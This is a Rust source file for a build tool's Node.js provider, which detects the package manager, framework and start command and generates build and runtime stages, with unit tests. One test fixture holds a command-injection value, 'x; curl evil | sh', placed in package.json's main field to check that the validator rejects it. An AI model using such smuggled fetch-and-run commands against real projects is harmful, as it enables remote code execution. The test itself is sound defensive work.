use crate::detect::AppContext;
use crate::error::Result;
use crate::plan::{BuildPlan, Command, CopyDirective, CopyFrom, Stage};
use crate::providers::Provider;

pub struct NodeProvider;

impl NodeProvider {
    fn detect_package_manager(ctx: &AppContext) -> PackageManager {
        if ctx.has_file("bun.lockb") || ctx.has_file("bun.lock") {
            PackageManager::Bun
        } else if ctx.has_file("pnpm-lock.yaml") {
            PackageManager::Pnpm
        } else if ctx.has_file("yarn.lock") {
            PackageManager::Yarn
        } else {
            PackageManager::Npm
        }
    }

    fn detect_start_command(ctx: &AppContext, pm: &PackageManager) -> Result<Option<String>> {
        let Ok(pkg) = ctx.read_file("package.json") else {
            return Ok(None);
        };
        let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&pkg) else {
            return Ok(None);
        };
        let Some(scripts) = parsed.get("scripts") else {
            return Ok(None);
        };

        if scripts.get("start").is_some() {
            return Ok(Some(format!("{} start", pm.run_prefix())));
        }

        // `main` is attacker-controlled repo metadata that lands in the runtime
        // `CMD`, so validate it before interpolation to block command injection
        if let Some(main) = parsed.get("main").and_then(|m| m.as_str()) {
            crate::sanitize::validate_token("package.json main", main)?;
            return Ok(Some(format!("node {main}")));
        }

        Ok(None)
    }

    fn has_build_script(ctx: &AppContext) -> bool {
        ctx.read_file("package.json")
            .ok()
            .and_then(|pkg| serde_json::from_str::<serde_json::Value>(&pkg).ok())
            .and_then(|parsed| parsed.get("scripts")?.get("build").cloned())
            .is_some()
    }

    // Next.js `output: 'export'` makes `next build` emit a static site to out/,
    // and `next start` then refuses to run ("does not work with output: export").
    // Detect it so the runtime serves the exported files statically instead of
    // running the app's (broken) `next start`.
    fn is_next_static_export(ctx: &AppContext) -> bool {
        const CONFIGS: [&str; 4] = ["next.config.js", "next.config.mjs", "next.config.ts", "next.config.cjs"];
        CONFIGS.iter().any(|cfg| {
            ctx.read_file(cfg).is_ok_and(|contents| {
                let normalized: String = contents.chars().filter(|c| !c.is_whitespace()).collect();
                normalized.contains("output:\"export\"") || normalized.contains("output:'export'")
            })
        })
    }

    /// Whether package.json lists `name` under dependencies or devDependencies.
    fn has_dependency(ctx: &AppContext, name: &str) -> bool {
        ctx.read_file("package.json")
            .ok()
            .and_then(|pkg| serde_json::from_str::<serde_json::Value>(&pkg).ok())
            .is_some_and(|parsed| {
                ["dependencies", "devDependencies"]
                    .iter()
                    .any(|section| parsed.get(section).and_then(|deps| deps.get(name)).is_some())
            })
    }

    /// The major version of a dependency from its package.json version spec
    /// (e.g. `^17.1.0` -> 17), ignoring range prefixes. `None` if absent or
    /// not a plain numeric spec (`workspace:*`, `next`, a git URL).
    fn dependency_major(ctx: &AppContext, name: &str) -> Option<u32> {
        let pkg = ctx.read_file("package.json").ok()?;
        let parsed: serde_json::Value = serde_json::from_str(&pkg).ok()?;
        let spec = ["dependencies", "devDependencies"].iter().find_map(|section| {
            parsed
                .get(section)
                .and_then(|deps| deps.get(name))
                .and_then(|v| v.as_str())
        })?;
        let digits: String = spec
            .trim_start_matches(['^', '~', '>', '=', 'v', ' '])
            .chars()
            .take_while(char::is_ascii_digit)
            .collect();
        digits.parse().ok()
    }

    /// The static output directory for an Angular app, read from `angular.json`'s
    /// build `outputPath`. Angular 17+ nests the browser bundle under a `browser`
    /// subdirectory, so that is appended for those versions. `None` if the file
    /// or field is missing, so a non-standard setup falls back to a Node runtime.
    fn angular_output_dir(ctx: &AppContext) -> Option<String> {
        let content = ctx.read_file("angular.json").ok()?;
        let json: serde_json::Value = serde_json::from_str(&content).ok()?;
        let projects = json.get("projects")?.as_object()?;
        let out = projects.values().find_map(|p| {
            p.pointer("/architect/build/options/outputPath")
                .and_then(|v| v.as_str())
        })?;
        crate::sanitize::validate_token("angular outputPath", out).ok()?;
        if Self::dependency_major(ctx, "@angular/core").is_some_and(|major| major >= 17) {
            Some(format!("{out}/browser"))
        } else {
            Some(out.to_string())
        }
    }

    /// The static output directory to serve for a build-to-static framework
    /// (Next.js `output: export`, Vite, Astro, Create React App, `SvelteKit` with
    /// the static adapter, or Angular), if this is one. Such a project builds to
    /// static assets and is served by a static file server rather than a Node
    /// process.
    fn static_output_dir(ctx: &AppContext) -> Option<String> {
        if Self::is_next_static_export(ctx) {
            return Some("out".to_string());
        }
        if Self::has_dependency(ctx, "vite") || Self::has_dependency(ctx, "astro") {
            return Some("dist".to_string());
        }
        if Self::has_dependency(ctx, "react-scripts") {
            return Some("build".to_string());
        }
        // SvelteKit with the static adapter prerenders the whole app to `build/`;
        // without it, SvelteKit is a Node server and is not served statically.
        if Self::has_dependency(ctx, "@sveltejs/adapter-static") {
            return Some("build".to_string());
        }
        if Self::has_dependency(ctx, "@angular/core") {
            return Self::angular_output_dir(ctx);
        }
        None
    }

    // node_modules from the deps stage, plus the built app (which includes any
    // generated output dir like Next's out/) from the build stage.
    fn runtime_copy_from(has_build: bool) -> Vec<CopyFrom> {
        let node_modules = CopyFrom {
            stage: "deps".to_string(),
            src: "/app/node_modules".to_string(),
            dest: "/app/node_modules".to_string(),
        };
        if has_build {
            vec![
                node_modules,
                CopyFrom {
                    stage: "build".to_string(),
                    src: "/app".to_string(),
                    dest: "/app".to_string(),
                },
            ]
        } else {
            vec![node_modules]
        }
    }

    /// Assemble the runtime stage: copy sources/artifacts and provision any
    /// package manager or static file server the start command needs.
    fn runtime_stage(
        pm: &PackageManager,
        has_build: bool,
        is_static_export: bool,
        start_cmd: Option<&str>,
        base_image: String,
    ) -> Stage {
        let mut copy_files = vec![];
        if !has_build {
            copy_files.push(CopyDirective {
                src: ".".to_string(),
                dest: ".".to_string(),
            });
        }

        // For a Next.js static export, install a static file server into the
        // runtime image so `serve out` can host the exported site. npm ships
        // with the node base image regardless of the app's package manager.
        let mut commands = if is_static_export {
            vec![Command {
                run: "npm install -g serve@14".to_string(),
                cache_mounts: vec![],
            }]
        } else {
            vec![]
        };

        // A `<pm> start` command needs the package manager present in the (slim)
        // runtime image too. `node <main>` starts and static exports do not.
        if !is_static_export {
            if let (Some(setup), Some(cmd)) = (pm.setup_command(), start_cmd) {
                if cmd.starts_with(pm.run_prefix()) {
                    commands.push(Command {
                        run: setup.to_string(),
                        cache_mounts: vec![],
                    });
                }
            }
        }

        Stage {
            name: "runtime".to_string(),
            base_image,
            workdir: "/app".to_string(),
            copy_files,
            copy_from: Self::runtime_copy_from(has_build),
            commands,
        }
    }
}

impl Provider for NodeProvider {
    fn name(&self) -> &'static str {
        "node"
    }

    fn detect(&self, ctx: &AppContext) -> bool {
        ctx.has_file("package.json")
    }

    fn plan(&self, ctx: &AppContext) -> Result<BuildPlan> {
        // A `packageManager` override skips lockfile sniffing; it must flow into
        // the enum (not just the command strings) so the corepack/bun setup and
        // lock-file copy match.
        let pm = ctx
            .overrides
            .package_manager
            .as_deref()
            .and_then(PackageManager::parse)
            .unwrap_or_else(|| Self::detect_package_manager(ctx));
        // An explicit build-command override forces a build stage even when the
        // package.json has no `build` script.
        let has_build = ctx.overrides.build_command.is_some() || Self::has_build_script(ctx);
        // A build-to-static framework (Next.js export, Vite, Astro, CRA) emits
        // static assets that are served by a static file server, not a Node
        // process; serve the framework's output directory instead.
        let static_dir = if has_build { Self::static_output_dir(ctx) } else { None };
        let is_static_export = static_dir.is_some();
        let start_cmd = if let Some(override_cmd) = ctx.overrides.start_command.clone() {
            Some(override_cmd)
        } else if let Some(dir) = &static_dir {
            Some(format!("serve {dir} -l 3000"))
        } else {
            Self::detect_start_command(ctx, &pm)?
        };

        // Runtime version: `version` override, else `.nvmrc`/`.node-version`,
        // else the current default. Slim runtime, full image for the build.
        let detected = crate::providers::version_from_file(ctx, ".nvmrc")
            .or_else(|| crate::providers::version_from_file(ctx, ".node-version"))
            .or_else(|| crate::providers::version_from_tool_files(ctx, &["node", "nodejs"]));
        let version = crate::providers::resolve_version(ctx, detected, "22")?;
        let base_image = format!("node:{version}-slim");
        let build_image = format!("node:{version}");

        // `npm ci` / `--frozen-lockfile` hard-fail without a committed lockfile
        // (e.g. a repo that never committed one, so detection fell back to npm,
        // or a package_manager override whose lockfile is not present). Drop the
        // frozen flag in that case so the build still succeeds.
        let has_lock = pm.has_lockfile(ctx);
        let install_cmd = ctx
            .overrides
            .install_command
            .clone()
            .unwrap_or_else(|| pm.install_command(has_lock));
        // Copy package.json and the lockfile in one directive: the lockfile is a
        // glob (`*`) so a missing lockfile does not fail the COPY, while
        // package.json guarantees at least one source matches.
        let deps_stage = Stage {
            name: "deps".to_string(),
            base_image: build_image.clone(),
            workdir: "/app".to_string(),
            copy_files: vec![CopyDirective {
                src: format!("package.json {}", pm.lock_glob()),
                dest: ".".to_string(),
            }],
            copy_from: vec![],
            // Ensure node_modules exists even for a zero-dependency project (some
            // package managers create nothing), or the later
            // `COPY --from=deps /app/node_modules` fails with "not found".
            commands: vec![Command {
                run: format!("{} && mkdir -p node_modules", pm.with_setup(install_cmd)),
                cache_mounts: pm.cache_dirs(),
            }],
        };

        let mut stages = vec![deps_stage];

        if has_build {
            stages.push(Stage {
                name: "build".to_string(),
                base_image: build_image,
                workdir: "/app".to_string(),
                copy_files: vec![CopyDirective {
                    src: ".".to_string(),
                    dest: ".".to_string(),
                }],
                copy_from: vec![CopyFrom {
                    stage: "deps".to_string(),
                    src: "/app/node_modules".to_string(),
                    dest: "/app/node_modules".to_string(),
                }],
                commands: vec![Command {
                    run: pm.with_setup(
                        ctx.overrides
                            .build_command
                            .clone()
                            .unwrap_or_else(|| format!("{} run build", pm.run_prefix())),
                    ),
                    cache_mounts: vec![],
                }],
            });
        }

        stages.push(Self::runtime_stage(
            &pm,
            has_build,
            is_static_export,
            start_cmd.as_deref(),
            base_image,
        ));

        Ok(BuildPlan {
            provider: "node".to_string(),
            stages,
            start_command: start_cmd,
            port: Some(3000),
            ..Default::default()
        })
    }
}

enum PackageManager {
    Npm,
    Yarn,
    Pnpm,
    Bun,
}

impl PackageManager {
    /// Parse a user-supplied package-manager override; unknown values fall back
    /// to lockfile detection.
    fn parse(s: &str) -> Option<Self> {
        match s.trim().to_ascii_lowercase().as_str() {
            "npm" => Some(Self::Npm),
            "yarn" => Some(Self::Yarn),
            "pnpm" => Some(Self::Pnpm),
            "bun" => Some(Self::Bun),
            _ => None,
        }
    }

    /// Install command for this package manager. With a committed lockfile use
    /// the reproducible/frozen install; without one fall back to the plain
    /// install (npm ci and --frozen-lockfile both hard-fail with no lockfile).
    fn install_command(&self, has_lock: bool) -> String {
        match (self, has_lock) {
            (Self::Npm, true) => "npm ci".to_string(),
            (Self::Npm, false) => "npm install".to_string(),
            (Self::Yarn, true) => "yarn install --frozen-lockfile".to_string(),
            (Self::Yarn, false) => "yarn install".to_string(),
            (Self::Pnpm, true) => "pnpm install --frozen-lockfile".to_string(),
            (Self::Pnpm, false) => "pnpm install".to_string(),
            (Self::Bun, _) => "bun install".to_string(),
        }
    }

    /// Make this package manager available before it is invoked. npm ships with
    /// the node base image; corepack (bundled with node) provisions pnpm/yarn,
    /// honoring the package.json `packageManager` pin; bun is not corepack-
    /// managed, so install it from npm. Without this, an auto-detected pnpm/yarn/
    /// bun build fails with "<pm>: not found".
    const fn setup_command(&self) -> Option<&'static str> {
        match self {
            Self::Npm => None,
            Self::Yarn | Self::Pnpm => Some("corepack enable"),
            Self::Bun => Some("npm install -g bun"),
        }
    }

    /// Prefix `cmd` with the package-manager setup when one is needed.
    fn with_setup(&self, cmd: String) -> String {
        match self.setup_command() {
            Some(setup) => format!("{setup} && {cmd}"),
            None => cmd,
        }
    }

    const fn run_prefix(&self) -> &str {
        match self {
            Self::Npm => "npm",
            Self::Yarn => "yarn",
            Self::Pnpm => "pnpm",
            Self::Bun => "bun",
        }
    }

    /// Concrete lockfile names to test for presence (no globs).
    const fn lock_file_names(&self) -> &'static [&'static str] {
        match self {
            Self::Npm => &["package-lock.json"],
            Self::Yarn => &["yarn.lock"],
            Self::Pnpm => &["pnpm-lock.yaml"],
            Self::Bun => &["bun.lockb", "bun.lock"],
        }
    }

    /// Whether a committed lockfile for this package manager is present.
    fn has_lockfile(&self, ctx: &AppContext) -> bool {
        self.lock_file_names().iter().any(|f| ctx.has_file(f))
    }

    /// Glob for the lockfile in a `COPY` line. The trailing `*` makes it
    /// optional so an absent lockfile does not fail the build (the directive is
    /// paired with package.json, which always matches).
    const fn lock_glob(&self) -> &'static str {
        match self {
            Self::Npm => "package-lock.json*",
            Self::Yarn => "yarn.lock*",
            Self::Pnpm => "pnpm-lock.yaml*",
            Self::Bun => "bun.lock*",
        }
    }

    fn cache_dirs(&self) -> Vec<String> {
        match self {
            Self::Npm => vec!["/root/.npm".to_string()],
            Self::Yarn => vec!["/usr/local/share/.cache/yarn".to_string()],
            Self::Pnpm => vec!["/root/.local/share/pnpm/store".to_string()],
            Self::Bun => vec!["/root/.bun/install/cache".to_string()],
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn setup_node_project(dir: &std::path::Path, pm: &str) {
        let pkg = r#"{"name":"test","scripts":{"start":"node server.js","build":"tsc"}}"#;
        std::fs::write(dir.join("package.json"), pkg).unwrap();
        match pm {
            "npm" => std::fs::write(dir.join("package-lock.json"), "{}").unwrap(),
            "bun" => std::fs::write(dir.join("bun.lock"), "").unwrap(),
            "pnpm" => std::fs::write(dir.join("pnpm-lock.yaml"), "").unwrap(),
            "yarn" => std::fs::write(dir.join("yarn.lock"), "").unwrap(),
            _ => {}
        }
    }

    #[test]
    fn rejects_injection_in_package_main() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"t","scripts":{},"main":"x; curl evil | sh"}"#,
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        assert!(
            NodeProvider.plan(&ctx).is_err(),
            "shell metachars in package.json main must be rejected"
        );
    }

    #[test]
    fn detects_node_project() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("package.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        assert!(NodeProvider.detect(&ctx));
    }

    #[test]
    fn does_not_detect_non_node() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("main.go"), "").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        assert!(!NodeProvider.detect(&ctx));
    }

    #[test]
    fn version_override_changes_node_base_image() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        let ctx = AppContext::with_overrides(
            dir.path(),
            crate::BuildOverrides {
                version: Some("20".to_string()),
                ..Default::default()
            },
        )
        .unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "node:20"), "build image");
        assert!(
            plan.stages.iter().any(|s| s.base_image == "node:20-slim"),
            "runtime image"
        );
    }

    #[test]
    fn nvmrc_sets_node_version() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        std::fs::write(dir.path().join(".nvmrc"), "18\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "node:18-slim"));
    }

    #[test]
    fn tool_versions_sets_node_version() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        std::fs::write(dir.path().join(".tool-versions"), "nodejs 21.6.2\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "node:21.6.2-slim"));
    }

    #[test]
    fn mise_toml_sets_node_version_and_nvmrc_wins_over_it() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        std::fs::write(dir.path().join("mise.toml"), "[tools]\nnode = \"20\"\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "node:20-slim"));

        // a language-native file (.nvmrc) outranks the generic mise config
        std::fs::write(dir.path().join(".nvmrc"), "18\n").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages.iter().any(|s| s.base_image == "node:18-slim"));
    }

    #[test]
    fn detects_npm() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.provider, "node");
        assert!(plan.stages[0].commands[0].run.contains("npm ci"));
        assert!(
            plan.stages[0].commands[0]
                .cache_mounts
                .contains(&"/root/.npm".to_string())
        );
    }

    #[test]
    fn detects_bun() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "bun");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert!(plan.stages[0].commands[0].run.contains("bun install"));
    }

    #[test]
    fn generates_build_stage_when_build_script_exists() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.stages.len(), 3);
        assert_eq!(plan.stages[1].name, "build");
    }

    #[test]
    fn skips_build_stage_when_no_build_script() {
        let dir = tempfile::tempdir().unwrap();
        let pkg = r#"{"name":"test","scripts":{"start":"node index.js"}}"#;
        std::fs::write(dir.path().join("package.json"), pkg).unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.stages.len(), 2);
        assert_eq!(plan.stages[0].name, "deps");
        assert_eq!(plan.stages[1].name, "runtime");
    }

    #[test]
    fn detects_start_command() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "npm");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("npm start"));
    }

    fn setup_next_export(dir: &std::path::Path, config: &str) {
        let pkg =
            r#"{"name":"web","scripts":{"build":"next build","start":"next start"},"dependencies":{"next":"13.5.1"}}"#;
        std::fs::write(dir.join("package.json"), pkg).unwrap();
        std::fs::write(dir.join("package-lock.json"), "{}").unwrap();
        std::fs::write(dir.join("next.config.js"), config).unwrap();
    }

    #[test]
    fn next_static_export_serves_out_instead_of_next_start() {
        let dir = tempfile::tempdir().unwrap();
        setup_next_export(
            dir.path(),
            "const nextConfig = { output: 'export', images: { unoptimized: true } };\nmodule.exports = nextConfig;",
        );
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        // Serves the exported site, not the broken `next start`
        assert_eq!(plan.start_command.as_deref(), Some("serve out -l 3000"));
        // Static server is installed into the runtime stage
        let runtime = plan.stages.last().unwrap();
        assert_eq!(runtime.name, "runtime");
        assert!(
            runtime.commands.iter().any(|c| c.run.contains("serve")),
            "runtime should install a static server"
        );
    }

    #[test]
    fn next_export_detected_with_double_quotes_and_whitespace() {
        let dir = tempfile::tempdir().unwrap();
        setup_next_export(dir.path(), "module.exports = {\n  output:   \"export\",\n};");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve out -l 3000"));
    }

    #[test]
    fn vite_project_serves_dist_statically() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"vite build"},"devDependencies":{"vite":"^5"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve dist -l 3000"));
        let runtime = plan.stages.last().unwrap();
        assert!(runtime.commands.iter().any(|c| c.run.contains("serve")));
    }

    #[test]
    fn astro_project_serves_dist_statically() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"astro build"},"dependencies":{"astro":"^4"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve dist -l 3000"));
    }

    #[test]
    fn cra_project_serves_build_statically() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"react-scripts build"},"dependencies":{"react-scripts":"5.0.1"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve build -l 3000"));
    }

    #[test]
    fn sveltekit_static_adapter_serves_build_dir() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"vite build"},"devDependencies":{"@sveltejs/kit":"^2","@sveltejs/adapter-static":"^3"}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve build -l 3000"));
    }

    #[test]
    fn angular_v17_serves_output_browser_subdir() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"ng build"},"dependencies":{"@angular/core":"^17.1.0"}}"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join("angular.json"),
            r#"{"projects":{"w":{"architect":{"build":{"options":{"outputPath":"dist/w"}}}}}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        // Angular 17+ writes the browser bundle under <outputPath>/browser
        assert_eq!(plan.start_command.as_deref(), Some("serve dist/w/browser -l 3000"));
    }

    #[test]
    fn angular_pre_v17_serves_output_path_directly() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"w","scripts":{"build":"ng build"},"dependencies":{"@angular/core":"^15.2.0"}}"#,
        )
        .unwrap();
        std::fs::write(
            dir.path().join("angular.json"),
            r#"{"projects":{"w":{"architect":{"build":{"options":{"outputPath":"dist/w"}}}}}}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("package-lock.json"), "{}").unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("serve dist/w -l 3000"));
    }

    #[test]
    fn next_without_export_uses_next_start() {
        let dir = tempfile::tempdir().unwrap();
        setup_next_export(dir.path(), "module.exports = { reactStrictMode: true };");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();
        assert_eq!(plan.start_command.as_deref(), Some("npm start"));
        let runtime = plan.stages.last().unwrap();
        assert!(runtime.commands.is_empty());
    }

    // Regression: pnpm/yarn/bun are not in the node base image, so an
    // auto-detected build must provision them or it fails "<pm>: not found".
    #[test]
    fn pnpm_enables_corepack_across_stages() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "pnpm");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        let deps = plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(
            deps.commands[0].run,
            "corepack enable && pnpm install --frozen-lockfile && mkdir -p node_modules"
        );
        let build = plan.stages.iter().find(|s| s.name == "build").unwrap();
        assert_eq!(build.commands[0].run, "corepack enable && pnpm run build");
        // start is `pnpm start`, so the runtime image enables corepack too.
        let runtime = plan.stages.iter().find(|s| s.name == "runtime").unwrap();
        assert!(runtime.commands.iter().any(|c| c.run == "corepack enable"));
    }

    #[test]
    fn bun_installs_itself_and_npm_needs_no_setup() {
        let bun_dir = tempfile::tempdir().unwrap();
        setup_node_project(bun_dir.path(), "bun");
        let bun_ctx = AppContext::new(bun_dir.path()).unwrap();
        let bun_plan = NodeProvider.plan(&bun_ctx).unwrap();
        let bun_deps = bun_plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(
            bun_deps.commands[0].run,
            "npm install -g bun && bun install && mkdir -p node_modules"
        );

        let npm_dir = tempfile::tempdir().unwrap();
        setup_node_project(npm_dir.path(), "npm");
        let npm_ctx = AppContext::new(npm_dir.path()).unwrap();
        let npm_plan = NodeProvider.plan(&npm_ctx).unwrap();
        let npm_deps = npm_plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(npm_deps.commands[0].run, "npm ci && mkdir -p node_modules");
    }

    #[test]
    fn yarn_enables_corepack_across_stages() {
        let dir = tempfile::tempdir().unwrap();
        setup_node_project(dir.path(), "yarn");
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        let deps = plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(
            deps.commands[0].run,
            "corepack enable && yarn install --frozen-lockfile && mkdir -p node_modules"
        );
        let build = plan.stages.iter().find(|s| s.name == "build").unwrap();
        assert_eq!(build.commands[0].run, "corepack enable && yarn run build");
        // start is `yarn start`, so the runtime image enables corepack too.
        let runtime = plan.stages.iter().find(|s| s.name == "runtime").unwrap();
        assert!(runtime.commands.iter().any(|c| c.run == "corepack enable"));
    }

    #[test]
    fn npm_without_lockfile_uses_install_not_ci() {
        // package.json but no committed lockfile: detection falls back to npm.
        // `npm ci` would fail with no package-lock.json, so use `npm install`.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"name":"t","scripts":{"start":"node i.js"}}"#,
        )
        .unwrap();
        let ctx = AppContext::new(dir.path()).unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        let deps = plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(deps.commands[0].run, "npm install && mkdir -p node_modules");
        // the lockfile is copied as an optional glob paired with package.json,
        // so an absent lockfile never fails the COPY.
        assert_eq!(deps.copy_files.len(), 1);
        assert_eq!(deps.copy_files[0].src, "package.json package-lock.json*");
    }

    #[test]
    fn pnpm_override_without_lockfile_drops_frozen_flag() {
        // A package_manager override with no matching lockfile present must not
        // emit --frozen-lockfile (which would hard-fail).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("package.json"), r#"{"name":"t"}"#).unwrap();
        let ctx = AppContext::with_overrides(
            dir.path(),
            crate::BuildOverrides {
                package_manager: Some("pnpm".to_string()),
                install_command: None,
                build_command: None,
                start_command: None,
                ..Default::default()
            },
        )
        .unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        let deps = plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(
            deps.commands[0].run,
            "corepack enable && pnpm install && mkdir -p node_modules"
        );
        assert_eq!(deps.copy_files[0].src, "package.json pnpm-lock.yaml*");
    }

    // Overrides win over lockfile/script detection (for setups auto-detect can't
    // handle). The package_manager override still flows into the corepack/bun
    // setup so the overridden install/build commands actually find the binary.
    #[test]
    fn overrides_take_precedence_over_detection() {
        let dir = tempfile::tempdir().unwrap();
        // npm lockfile on disk, but everything is overridden to pnpm + custom.
        setup_node_project(dir.path(), "npm");
        let ctx = AppContext::with_overrides(
            dir.path(),
            crate::BuildOverrides {
                package_manager: Some("pnpm".to_string()),
                install_command: Some("pnpm install --prod".to_string()),
                build_command: Some("pnpm turbo build".to_string()),
                start_command: Some("node dist/main.js".to_string()),
                ..Default::default()
            },
        )
        .unwrap();
        let plan = NodeProvider.plan(&ctx).unwrap();

        let deps = plan.stages.iter().find(|s| s.name == "deps").unwrap();
        assert_eq!(
            deps.commands[0].run,
            "corepack enable && pnpm install --prod && mkdir -p node_modules"
        );
        let build = plan.stages.iter().find(|s| s.name == "build").unwrap();
        assert_eq!(build.commands[0].run, "corepack enable && pnpm turbo build");
        assert_eq!(plan.start_command.as_deref(), Some("node dist/main.js"));
        // start is `node ...`, not `<pm> ...`, so the runtime needs no pm setup.
        let runtime = plan.stages.iter().find(|s| s.name == "runtime").unwrap();
        assert!(runtime.commands.is_empty());
    }
}
